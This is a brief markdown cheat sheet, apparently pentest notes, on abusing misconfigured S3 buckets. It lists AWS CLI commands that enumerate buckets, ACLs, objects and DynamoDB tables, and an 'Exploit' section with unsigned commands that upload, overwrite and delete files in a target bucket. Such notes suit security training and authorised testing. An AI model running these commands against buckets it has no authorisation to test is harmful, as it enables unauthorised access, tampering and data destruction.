# S3 Bucket

## Enumeration

### List bucket

> With no sign request

    aws s3 ls --endpoint-url=http://domain.com --no-sign-request

> With sign request

Config key 

    aws Config

Request

    aws s3 ls --endpoint-url=http://domain.com

> s3api

    aws s3api list-buckets --endpoint-url=http://domain.com | jq
    aws s3api get-bucket-acl --endpoint-url=http://domain.com --bucket BucketName  | jq
    aws s3api list-objects --endpoint-url=http://domain.com --bucket BucketName | jq 

> dynamodb

    aws dynamodb list-global-tables --endpoint-url http://domain.com | jq
    aws dynamodb list-tables --endpoint-url http://domain.com | jq
    aws dynamodb scan --table-name TableName --endpoint-url http://domain.com  | jq

## Exploit 

> Create bucket


> Move File

    aws s3 mv YourFile s3://BucketName/TargetFile --no-sign-request

> Copy Files

    aws s3 cp YourFile s3://BucketName/TargetFile --no-sign-request

> Delete Files

    aws s3 rm s3://BucketName/TargetFile --no-sign-request

## Source 

    https://medium.com/@janijay007/s3-bucket-misconfiguration-from-basics-to-pawn-6893776d1007
    https://medium.com/techiepedia/s3-bucket-misconfiguration-50883f347869
    https://docs.aws.amazon.com/cli/latest/reference/dynamodb/list-tables.html